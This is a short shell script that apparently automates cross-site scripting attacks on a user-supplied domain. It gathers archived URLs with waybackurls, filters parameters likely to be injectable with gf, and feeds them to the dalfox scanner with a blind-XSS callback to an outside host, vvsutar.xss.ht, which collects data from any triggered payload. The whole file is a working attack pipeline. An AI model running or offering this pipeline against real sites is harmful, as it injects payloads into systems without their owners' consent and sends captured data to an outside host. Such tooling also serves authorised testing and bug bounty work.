echo "Enter your Domain Name"
read s

waybackurls $s | gf xss | sed 's/=.*/=/' | sort -u | uniq | tee FILE.txt && cat FILE.txt | dalfox -b https://vvsutar.xss.ht pipe > OUT.txt
